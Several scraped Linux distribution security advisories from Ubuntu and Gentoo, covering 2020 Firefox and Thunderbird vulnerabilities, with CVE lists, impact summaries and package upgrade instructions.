* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-4278-2: Firefox vulnerabilities

26 February 2020

Firefox could be made to crash or run programs as your login if it
opened a malicious website.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 16.04 ESM](/security/notices?release=xenial)

## Packages

* [firefox](/security/cves?package=firefox) - Mozilla Open Source web browser

## Details

USN-4278-1 fixed vulnerabilities in Firefox. This update provides the

corresponding update for Ubuntu 16.04 LTS.

Original advisory details:

Multiple security issues were discovered in Firefox. If a user were tricked

in to opening a specially crafted website, an attacker could potentially

exploit these to cause a denial of service, conduct cross-site scripting

(XSS) attacks, or execute arbitrary code.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 16.04

* [firefox](https://launchpad.net/ubuntu/%2Bsource/firefox)
  -
  [73.0.1+build1-0ubuntu0.16.04.1](https://launchpad.net/ubuntu/%2Bsource/firefox/73.0.1%2Bbuild1-0ubuntu0.16.04.1)

After a standard system update you need to restart Firefox to make

all the necessary changes.

## References

* [CVE-2020-6796](/security/CVE-2020-6796)
* [CVE-2020-6798](/security/CVE-2020-6798)
* [CVE-2020-6800](/security/CVE-2020-6800)
* [CVE-2020-6801](/security/CVE-2020-6801)

## Related notices

* [USN-4278-1](/security/notices/USN-4278-1)
* [USN-4328-1](/security/notices/USN-4328-1)
* [USN-4335-1](/security/notices/USN-4335-1)

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from usn.ubuntu.com_65cb1c48_20250119_123141.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-4335-1: Thunderbird vulnerabilities

21 April 2020

Several security issues were fixed in Thunderbird.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 16.04 ESM](/security/notices?release=xenial)

## Packages

* [thunderbird](/security/cves?package=thunderbird) - Mozilla Open Source mail and newsgroup client

## Details

Multiple security issues were discovered in Thunderbird. If a user were

tricked in to opening a specially crafted website in a browsing context,

an attacker could potentially exploit these to cause a denial of service,

obtain sensitive information, bypass security restrictions, bypass

same-origin restrictions, conduct cross-site scripting (XSS) attacks, or

execute arbitrary code. ([CVE-2019-11757](/security/CVE-2019-11757), [CVE-2019-11758](/security/CVE-2019-11758), [CVE-2019-11759](/security/CVE-2019-11759),

[CVE-2019-11760](/security/CVE-2019-11760), [CVE-2019-11761](/security/CVE-2019-11761), [CVE-2019-11762](/security/CVE-2019-11762), [CVE-2019-11763](/security/CVE-2019-11763),

[CVE-2019-11764](/security/CVE-2019-11764), [CVE-2019-17005](/security/CVE-2019-17005), [CVE-2019-17008](/security/CVE-2019-17008), [CVE-2019-17010](/security/CVE-2019-17010),

[CVE-2019-17011](/security/CVE-2019-17011), [CVE-2019-17012](/security/CVE-2019-17012), [CVE-2019-17016](/security/CVE-2019-17016), [CVE-2019-17017](/security/CVE-2019-17017),

[CVE-2019-17022](/security/CVE-2019-17022), [CVE-2019-17024](/security/CVE-2019-17024), [CVE-2019-17026](/security/CVE-2019-17026), [CVE-2019-20503](/security/CVE-2019-20503),

[CVE-2020-6798](/security/CVE-2020-6798), [CVE-2020-6800](/security/CVE-2020-6800), [CVE-2020-6805](/security/CVE-2020-6805), [CVE-2020-6806](/security/CVE-2020-6806), [CVE-2020-6807](/security/CVE-2020-6807),

[CVE-2020-6812](/security/CVE-2020-6812), [CVE-2020-6814](/security/CVE-2020-6814), [CVE-2020-6819](/security/CVE-2020-6819), [CVE-2020-6820](/security/CVE-2020-6820), [CVE-2020-6821](/security/CVE-2020-6821),

[CVE-2020-6825](/security/CVE-2020-6825))

It was discovered that NSS incorrectly handled certain memory operations.

A remote attacker could potentially exploit this to cause a denial of

service, or execute arbitrary code. ([CVE-2019-11745](/security/CVE-2019-11745))

It was discovered that a specially crafted S/MIME message with an inner

encryption layer could be displayed as having a valid signature in some

circumstances, even if the signer had no access to the encrypted message.

An attacker could potentially exploit this to spoof the message author.

([CVE-2019-11755](/security/CVE-2019-11755))

A heap overflow was discovered in the expat library in Thunderbird. If a

user were tricked in to opening a specially crafted message, an attacker

could potentially exploit this to cause a denial of service, or execute

arbitrary code. ([CVE-2019-15903](/security/CVE-2019-15903))

It was discovered that Message ID calculation was based on uninitialized

data. An attacker could potentially exploit this to obtain sensitive

information. ([CVE-2020-6792](/security/CVE-2020-6792))

Mutiple security issues were discovered in Thunderbird. If a user were

tricked in to opening a specially crafted message, an attacker could

potentially exploit these to cause a denial of service, obtain sensitive

information, or execute arbitrary code. ([CVE-2020-6793](/security/CVE-2020-6793), [CVE-2020-6795](/security/CVE-2020-6795),

[CVE-2020-6822](/security/CVE-2020-6822))

It was discovered that if a user saved passwords before Thunderbird 60 and

then later set a primary password, an unencrypted copy of these passwords

would still be accessible. A local user could exploit this to obtain

sensitive information. ([CVE-2020-6794](/security/CVE-2020-6794))

It was discovered that the Devtools’ ‘Copy as cURL’ feature did not

fully escape website-controlled data. If a user were tricked in to using

the ‘Copy as cURL’ feature to copy and paste a command with specially

crafted data in to a terminal, an attacker could potentially exploit this

to execute arbitrary commands via command injection. ([CVE-2020-6811](/security/CVE-2020-6811))

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 16.04

* [thunderbird](https://launchpad.net/ubuntu/%2Bsource/thunderbird)
  -
  [1:68.7.0+build1-0ubuntu0.16.04.2](https://launchpad.net/ubuntu/%2Bsource/thunderbird/1%3A68.7.0%2Bbuild1-0ubuntu0.16.04.2)

After a standard system update you need to restart Thunderbird to make

all the necessary changes.

## References

* [CVE-2019-11745](/security/CVE-2019-11745)
* [CVE-2019-11755](/security/CVE-2019-11755)
* [CVE-2019-11757](/security/CVE-2019-11757)
* [CVE-2019-11758](/security/CVE-2019-11758)
* [CVE-2019-11759](/security/CVE-2019-11759)
* [CVE-2019-11760](/security/CVE-2019-11760)
* [CVE-2019-11761](/security/CVE-2019-11761)
* [CVE-2019-11762](/security/CVE-2019-11762)
* [CVE-2019-11763](/security/CVE-2019-11763)
* [CVE-2019-11764](/security/CVE-2019-11764)
* [CVE-2019-15903](/security/CVE-2019-15903)
* [CVE-2019-17005](/security/CVE-2019-17005)
* [CVE-2019-17008](/security/CVE-2019-17008)
* [CVE-2019-17010](/security/CVE-2019-17010)
* [CVE-2019-17011](/security/CVE-2019-17011)
* [CVE-2019-17012](/security/CVE-2019-17012)
* [CVE-2019-17016](/security/CVE-2019-17016)
* [CVE-2019-17017](/security/CVE-2019-17017)
* [CVE-2019-17022](/security/CVE-2019-17022)
* [CVE-2019-17024](/security/CVE-2019-17024)
* [CVE-2019-17026](/security/CVE-2019-17026)
* [CVE-2019-20503](/security/CVE-2019-20503)
* [CVE-2020-6792](/security/CVE-2020-6792)
* [CVE-2020-6793](/security/CVE-2020-6793)
* [CVE-2020-6794](/security/CVE-2020-6794)
* [CVE-2020-6795](/security/CVE-2020-6795)
* [CVE-2020-6798](/security/CVE-2020-6798)
* [CVE-2020-6800](/security/CVE-2020-6800)
* [CVE-2020-6805](/security/CVE-2020-6805)
* [CVE-2020-6806](/security/CVE-2020-6806)
* [CVE-2020-6807](/security/CVE-2020-6807)
* [CVE-2020-6811](/security/CVE-2020-6811)
* [CVE-2020-6812](/security/CVE-2020-6812)
* [CVE-2020-6814](/security/CVE-2020-6814)
* [CVE-2020-6819](/security/CVE-2020-6819)
* [CVE-2020-6820](/security/CVE-2020-6820)
* [CVE-2020-6821](/security/CVE-2020-6821)
* [CVE-2020-6822](/security/CVE-2020-6822)
* [CVE-2020-6825](/security/CVE-2020-6825)

## Related notices

* [USN-4216-2](/security/notices/USN-4216-2)
* [USN-4216-1](/security/notices/USN-4216-1)
* [USN-4241-1](/security/notices/USN-4241-1)
* [USN-4203-1](/security/notices/USN-4203-1)
* [USN-4203-2](/security/notices/USN-4203-2)
* [USN-4202-1](/security/notices/USN-4202-1)
* [USN-4165-1](/security/notices/USN-4165-1)
* [USN-4132-2](/security/notices/USN-4132-2)
* [USN-4132-1](/security/notices/USN-4132-1)
* [USN-4852-1](/security/notices/USN-4852-1)
* [USN-5455-1](/security/notices/USN-5455-1)
* [USN-7199-1](/security/notices/USN-7199-1)
* [USN-4234-1](/security/notices/USN-4234-1)
* [USN-4328-1](/security/notices/USN-4328-1)
* [USN-4299-1](/security/notices/USN-4299-1)
* [USN-4278-1](/security/notices/USN-4278-1)
* [USN-4278-2](/security/notices/USN-4278-2)
* [USN-4317-1](/security/notices/USN-4317-1)
* [USN-4323-1](/security/notices/USN-4323-1)

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from security.gentoo.org_44adb626_20250119_123140.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# Mozilla Thunderbird: Multiple vulnerabilities — GLSA **202003-10**

Multiple vulnerabilities have been found in Mozilla Thunderbird,
the worst of which could result in the arbitrary execution of code.

### Affected packages

| Package | **mail-client/thunderbird** on all architectures |
| --- | --- |
| Affected versions | < **68.6.0** |
| Unaffected versions | >= **68.6.0** |

| Package | **mail-client/thunderbird-bin** on all architectures |
| --- | --- |
| Affected versions | < **68.6.0** |
| Unaffected versions | >= **68.6.0** |

### Background

Mozilla Thunderbird is a popular open-source email client from the
Mozilla project.

### Description

Multiple vulnerabilities have been discovered in Mozilla Thunderbird.
Please review the CVE identifiers referenced below for details.

### Impact

A remote attacker may be able to execute arbitrary code, cause a Denial
of Service condition, obtain sensitive information, or conduct Cross-Site
Request Forgery (CSRF).

### Workaround

There is no known workaround at this time.

### Resolution

All Mozilla Thunderbird users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=mail-client/thunderbird-68.6.0"

```

All Mozilla Thunderbird binary users should upgrade to the latest
version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose
 ">=mail-client/thunderbird-bin-68.6.0"

```
### References

* [MFSA-2019-35](https://www.mozilla.org/en-US/security/advisories/mfsa2019-35/)
* [MFSA-2019-37](https://www.mozilla.org/en-US/security/advisories/mfsa2019-37/)
* [MFSA-2020-07](https://www.mozilla.org/en-US/security/advisories/mfsa2020-07/)
* [MFSA-2020-10](https://www.mozilla.org/en-US/security/advisories/mfsa2020-10/)
* [CVE-2019-11745](https://nvd.nist.gov/vuln/detail/CVE-2019-11745)
* [CVE-2019-11757](https://nvd.nist.gov/vuln/detail/CVE-2019-11757)
* [CVE-2019-11759](https://nvd.nist.gov/vuln/detail/CVE-2019-11759)
* [CVE-2019-11760](https://nvd.nist.gov/vuln/detail/CVE-2019-11760)
* [CVE-2019-11761](https://nvd.nist.gov/vuln/detail/CVE-2019-11761)
* [CVE-2019-11762](https://nvd.nist.gov/vuln/detail/CVE-2019-11762)
* [CVE-2019-11763](https://nvd.nist.gov/vuln/detail/CVE-2019-11763)
* [CVE-2019-11764](https://nvd.nist.gov/vuln/detail/CVE-2019-11764)
* [CVE-2019-17005](https://nvd.nist.gov/vuln/detail/CVE-2019-17005)
* [CVE-2019-17008](https://nvd.nist.gov/vuln/detail/CVE-2019-17008)
* [CVE-2019-17010](https://nvd.nist.gov/vuln/detail/CVE-2019-17010)
* [CVE-2019-17011](https://nvd.nist.gov/vuln/detail/CVE-2019-17011)
* [CVE-2019-17012](https://nvd.nist.gov/vuln/detail/CVE-2019-17012)
* [CVE-2019-20503](https://nvd.nist.gov/vuln/detail/CVE-2019-20503)
* [CVE-2020-6792](https://nvd.nist.gov/vuln/detail/CVE-2020-6792)
* [CVE-2020-6793](https://nvd.nist.gov/vuln/detail/CVE-2020-6793)
* [CVE-2020-6794](https://nvd.nist.gov/vuln/detail/CVE-2020-6794)
* [CVE-2020-6795](https://nvd.nist.gov/vuln/detail/CVE-2020-6795)
* [CVE-2020-6798](https://nvd.nist.gov/vuln/detail/CVE-2020-6798)
* [CVE-2020-6800](https://nvd.nist.gov/vuln/detail/CVE-2020-6800)
* [CVE-2020-6805](https://nvd.nist.gov/vuln/detail/CVE-2020-6805)
* [CVE-2020-6806](https://nvd.nist.gov/vuln/detail/CVE-2020-6806)
* [CVE-2020-6807](https://nvd.nist.gov/vuln/detail/CVE-2020-6807)
* [CVE-2020-6811](https://nvd.nist.gov/vuln/detail/CVE-2020-6811)
* [CVE-2020-6812](https://nvd.nist.gov/vuln/detail/CVE-2020-6812)
* [CVE-2020-6814](https://nvd.nist.gov/vuln/detail/CVE-2020-6814)

**Release date**

March 14, 2020

**Latest revision**

March 14, 2020: 1

**Severity**

high

**Exploitable**

remote

**Bugzilla entries**

* [698516](https://bugs.gentoo.org/show_bug.cgi?id=698516)
* [702638](https://bugs.gentoo.org/show_bug.cgi?id=702638)
* [709350](https://bugs.gentoo.org/show_bug.cgi?id=709350)
* [712518](https://bugs.gentoo.org/show_bug.cgi?id=712518)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**



=== Content from security.gentoo.org_984975ef_20250119_123139.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# Mozilla Firefox: Multiple vulnerabilities — GLSA **202003-02**

Multiple vulnerabilities have been found in Mozilla Firefox, the
worst of which may allow execution of arbitrary code.

### Affected packages

| Package | **www-client/firefox** on all architectures |
| --- | --- |
| Affected versions | < **68.6.0** |
| Unaffected versions | >= **68.6.0** |

| Package | **www-client/firefox-bin** on all architectures |
| --- | --- |
| Affected versions | < **68.6.0** |
| Unaffected versions | >= **68.6.0** |

### Background

Mozilla Firefox is a popular open-source web browser from the Mozilla
Project.

### Description

Multiple vulnerabilities have been discovered in Mozilla Firefox. Please
review the CVE identifiers referenced below for details.

### Impact

A remote attacker could entice a user to view a specially crafted web
page, possibly resulting in the execution of arbitrary code with the
privileges of the process or a Denial of Service condition. Furthermore,
a remote attacker may be able to perform Man-in-the-Middle attacks,
obtain sensitive information, spoof the address bar, conduct clickjacking
attacks, bypass security restrictions and protection mechanisms, or have
other unspecified impact.

### Workaround

There is no known workaround at this time.

### Resolution

All Mozilla Firefox users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=www-client/firefox-68.6.0"

```

All Mozilla Firefox binary users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=www-client/firefox-bin-68.6.0"

```
### References

* [CVE-2019-11745](https://nvd.nist.gov/vuln/detail/CVE-2019-11745)
* [CVE-2019-17005](https://nvd.nist.gov/vuln/detail/CVE-2019-17005)
* [CVE-2019-17008](https://nvd.nist.gov/vuln/detail/CVE-2019-17008)
* [CVE-2019-17010](https://nvd.nist.gov/vuln/detail/CVE-2019-17010)
* [CVE-2019-17011](https://nvd.nist.gov/vuln/detail/CVE-2019-17011)
* [CVE-2019-17012](https://nvd.nist.gov/vuln/detail/CVE-2019-17012)
* [CVE-2019-17016](https://nvd.nist.gov/vuln/detail/CVE-2019-17016)
* [CVE-2019-17017](https://nvd.nist.gov/vuln/detail/CVE-2019-17017)
* [CVE-2019-17022](https://nvd.nist.gov/vuln/detail/CVE-2019-17022)
* [CVE-2019-17024](https://nvd.nist.gov/vuln/detail/CVE-2019-17024)
* [CVE-2019-17026](https://nvd.nist.gov/vuln/detail/CVE-2019-17026)
* [CVE-2019-20503](https://nvd.nist.gov/vuln/detail/CVE-2019-20503)
* [CVE-2020-6796](https://nvd.nist.gov/vuln/detail/CVE-2020-6796)
* [CVE-2020-6797](https://nvd.nist.gov/vuln/detail/CVE-2020-6797)
* [CVE-2020-6798](https://nvd.nist.gov/vuln/detail/CVE-2020-6798)
* [CVE-2020-6799](https://nvd.nist.gov/vuln/detail/CVE-2020-6799)
* [CVE-2020-6800](https://nvd.nist.gov/vuln/detail/CVE-2020-6800)
* [CVE-2020-6805](https://nvd.nist.gov/vuln/detail/CVE-2020-6805)
* [CVE-2020-6806](https://nvd.nist.gov/vuln/detail/CVE-2020-6806)
* [CVE-2020-6807](https://nvd.nist.gov/vuln/detail/CVE-2020-6807)
* [CVE-2020-6811](https://nvd.nist.gov/vuln/detail/CVE-2020-6811)
* [CVE-2020-6812](https://nvd.nist.gov/vuln/detail/CVE-2020-6812)
* [CVE-2020-6814](https://nvd.nist.gov/vuln/detail/CVE-2020-6814)
* [MFSA-2019-37](https://www.mozilla.org/en-US/security/advisories/mfsa2019-37/)
* [MFSA-2020-03](https://www.mozilla.org/en-US/security/advisories/mfsa2020-03/)
* [MFSA-2020-06](https://www.mozilla.org/en-US/security/advisories/mfsa2020-06/)
* [MFSA-2020-09](https://www.mozilla.org/en-US/security/advisories/mfsa2020-09/)

**Release date**

March 12, 2020

**Latest revision**

March 12, 2020: 2

**Severity**

normal

**Exploitable**

remote

**Bugzilla entries**

* [702638](https://bugs.gentoo.org/show_bug.cgi?id=702638)
* [705000](https://bugs.gentoo.org/show_bug.cgi?id=705000)
* [709346](https://bugs.gentoo.org/show_bug.cgi?id=709346)
